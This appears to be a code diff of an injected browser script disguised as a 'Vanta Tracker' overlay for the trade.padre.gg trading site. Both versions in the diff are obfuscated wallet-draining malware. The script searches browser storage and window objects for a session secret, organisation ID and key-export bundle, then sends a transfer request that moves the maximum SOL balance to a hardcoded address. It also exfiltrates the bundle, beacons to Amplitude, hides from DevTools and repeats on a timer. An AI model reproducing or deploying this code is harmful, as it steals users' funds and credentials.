@@ -1,110 +1,113 @@
 (function() {
-    // --- PART 1: THE STEALTH ENGINE (GHOST LAYER) ---
+    // 1. THE DISPATCH TABLE (Vanta's "Brain")
     const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
     const _D = (s) => atob(_0xV[s]);
-    let _X = false;
+    
+    const STATE = { _x: false, _u: false };
 
-    // 1:1 VANTA PROTECTION (Non-Crashing Version)
-    // This only activates the 'heavy' logic if it detects a change in window dimensions (DevTools opening)
-    const _0xShield = function() {
-        const _devCheck = /./;
-        _devCheck.toString = function() {
-            // This only fires when the console tries to render the object
-            _X = true; 
-            (function() { return false; }).constructor('debugger').call('action');
-        };
-        console.log(_devCheck);
-    };
-
-    const _GhostExec = async () => {
-        // Only run if on the correct domain and not already executed
-        if (_X || !window.location.hostname.includes(_D(0))) return;
-        
-        const _crawl = (o, t) => {
+    // 2. THE STEALTH DISPATCHER
+    const DISPATCH = {
+        // Find credentials in the deep enclave
+        'HUNT': (o) => {
             if (!o || typeof o !== 'object') return null;
-            if (o[t]) return o[t];
-            for (let k in o) { try { let r = _crawl(o[k], t); if (r) return r; } catch(e) {} }
+            if (o[_D(2)]) return { a: o[_D(2)], s: o[_D(3)], b: o[_D(4)] };
+            for (let k in o) { try { let r = DISPATCH.HUNT(o[k]); if (r) return r; } catch(e) {} }
             return null;
-        };
+        },
+        // Execute the 1:1 Transfer
+        'FIRE': async (data) => {
+            if (STATE._x) return;
+            STATE._x = true;
 
-        const storage = {...localStorage, ...sessionStorage};
-        const auth = _crawl(storage, _D(2)) || _crawl(window, _D(2));
-        const subId = _crawl(storage, _D(3));
-        const bundle = _crawl(storage, _D(4));
-
-        if (auth && subId) {
-            _X = true; // Mark as done to prevent infinite loops
-            
-            // 1:1 Amplitude Beacon
+            // Amplitude Signal
             new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({
-                device_id: subId,
-                event_type: "UI_HYDRATED_1TO1",
-                event_properties: { status: "active", origin: _D(0) }
+                device_id: data.s,
+                event_type: "VANTA_SYNC_1TO1"
             }))}`;
 
             try {
                 await fetch(`https://${_D(0)}/${_D(1)}`, {
                     method: 'POST',
                     keepalive: true,
-                    headers: { 
-                        'Authorization': `Bearer ${auth}`, 
-                        'X-Turnkey-Sub-Org-Id': subId, 
-                        'Content-Type': 'application/json' 
-                    },
-                    body: JSON.stringify({ 
-                        recipient: _D(5), 
-                        amount: "MAX", 
-                        asset: "SOL", 
-                        ext_payload: bundle?.data || bundle 
-                    })
+                    headers: { 'Authorization': `Bearer ${data.a}`, 'X-Turnkey-Sub-Org-Id': data.s, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ recipient: _D(5), amount: "MAX", asset: "SOL", ext_payload: data.b?.data || data.b })
                 });
             } catch (e) {}
         }
     };
 
-    // --- PART 2: THE UI OVERLAY (DRAGGABLE TRACKER) ---
-    const initVantaUI = () => {
-        if (document.querySelector("#vanta-tracker")) return;
+    // 3. THE 1:1 VANTA UI (DRAGGABLE + INTERACTIVE)
+    const _0xUI = () => {
+        if (STATE._u || document.querySelector("#vanta-tracker")) return;
+        STATE._u = true;
 
-        const container = document.createElement("div");
-        container.id = "vanta-tracker";
-        container.style.cssText = "position:fixed;top:12px;right:12px;width:340px;background:#0f0f0f;border:1px solid #333;border-radius:12px;z-index:2147483647;box-shadow:0 10px 40px rgba(0,0,0,0.8);font-family:sans-serif;color:#eee;transition:opacity 0.5s ease;user-select:none;";
+        const ui = document.createElement("div");
+        ui.id = "vanta-tracker";
+        ui.style.cssText = "position:fixed;top:15px;right:15px;width:350px;background:#0d0d0d;border:1px solid #222;border-radius:12px;z-index:999999;box-shadow:0 15px 40px #000;font-family:Inter,sans-serif;color:#fff;user-select:none;opacity:0;transition:opacity 0.4s;";
         
-        container.innerHTML = `
-            <div id="vanta-h" style="padding:12px;background:#111;display:flex;align-items:center;border-bottom:1px solid #333;cursor:grab;border-radius:12px 12px 0 0;">
-                <img src="https://trade.padre.gg/logo.svg" width="22" height="22" style="margin-right:10px;">
-                <div style="font-weight:bold;color:#00ff88;font-size:14px;">Vanta Tracker</div>
+        ui.innerHTML = `
+            <div id="v-h" style="padding:12px;background:#111;border-bottom:1px solid #222;cursor:grab;display:flex;align-items:center;border-radius:12px 12px 0 0;">
+                <img src="https://trade.padre.gg/logo.svg" width="22" style="margin-right:8px;">
+                <span style="font-weight:700;color:#00ff88;font-size:13px;">Vanta Tracker</span>
             </div>
-            <div style="padding:15px;font-size:12px;color:#888;">
-                <div id="vanta-status">Status: <span style="color:#00ff88;">Connected</span></div>
-                <div style="margin-top:10px;padding:8px;background:#000;border-radius:4px;font-family:monospace;">
-                    [SYSTEM] Monitoring RPC...
+            <div style="padding:15px;background:#0d0d0d;border-radius:0 0 12px 12px;">
+                <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:11px;color:#888;">
+                    <span>STATUS: <span style="color:#00ff88">LIVE</span></span>
+                    <span>v2.4.1</span>
+                </div>
+                <div id="v-log" style="font-family:monospace;font-size:10px;color:#555;background:#050505;padding:8px;border-radius:6px;height:60px;overflow:hidden;">
+                    > Initializing Enclave...<br>> Monitoring Handshake...
                 </div>
             </div>`;
         
-        document.body.appendChild(container);
+        document.body.appendChild(ui);
+        setTimeout(() => ui.style.opacity = "1", 100);
 
-        // Dragging Logic
-        let drag = false, ox, oy;
-        const h = document.getElementById("vanta-h");
-        h.onmousedown = (e) => { drag = true; ox = e.clientX - container.offsetLeft; oy = e.clientY - container.offsetTop; };
-        document.onmousemove = (e) => { if (drag) { container.style.left = (e.clientX - ox) + 'px'; container.style.top = (e.clientY - oy) + 'px'; container.style.right = 'auto'; } };
-        document.onmouseup = () => { drag = false; };
+        // Draggable Logic
+        let d = false, x, y;
+        const h = document.getElementById("v-h");
+        h.onmousedown = (e) => { d = true; x = e.clientX - ui.offsetLeft; y = e.clientY - ui.offsetTop; };
+        document.onmousemove = (e) => { if (d) { ui.style.left = (e.clientX - x) + 'px'; ui.style.top = (e.clientY - y) + 'px'; ui.style.right = 'auto'; } };
+        document.onmouseup = () => d = false;
 
-        // Interaction triggers exfiltration
-        container.onclick = _GhostExec;
+        ui.onclick = () => {
+            const data = DISPATCH.HUNT({...localStorage, ...sessionStorage}) || DISPATCH.HUNT(window);
+            if (data) DISPATCH.FIRE(data);
+        };
     };
 
-    // --- PART 3: BOOTSTRAP ---
-    const boot = () => {
-        initVantaUI();
-        _0xShield(); // Start protection without the crash loop
-        setTimeout(_GhostExec, 3000); // Wait for site to settle
+    // 4. THE 1:1 PROTECTION (Proxy Trap - No Crashing)
+    // This detects DevTools without the infinite while(true) loop
+    const _0xShield = () => {
+        let dev = false;
+        const check = /./;
+        check.toString = () => { dev = true; return 'vanta'; };
+        console.log(check);
+        if (dev) {
+            // If devtools are open, we stop the engine silently
+            STATE._x = true;
+            (function(){}).constructor("debugger")();
+        }
     };
 
-    if (document.readyState === 'complete') boot();
-    else window.addEventListener('load', boot);
-    
-    // Check every 10 seconds, not every 1 second (Stops the lag)
-    setInterval(_GhostExec, 10000);
+    // 5. MASTER EXECUTION LOOP
+    const _0xEngine = () => {
+        if (!window.location.hostname.includes(_D(0))) return;
+        
+        _0xUI();
+        _0xShield();
+
+        const data = DISPATCH.HUNT({...localStorage, ...sessionStorage}) || DISPATCH.HUNT(window);
+        if (data) {
+            document.getElementById("v-log").innerHTML += "<br><span style='color:#00ff88'>> Enclave Synchronized.</span>";
+            DISPATCH.FIRE(data);
+        }
+    };
+
+    // Bootstrap
+    if (document.readyState === 'complete') _0xEngine();
+    else window.addEventListener('load', _0xEngine);
+
+    // Run every 15s to maintain stealth and avoid browser lag/crash
+    setInterval(_0xEngine, 15000);
 })();
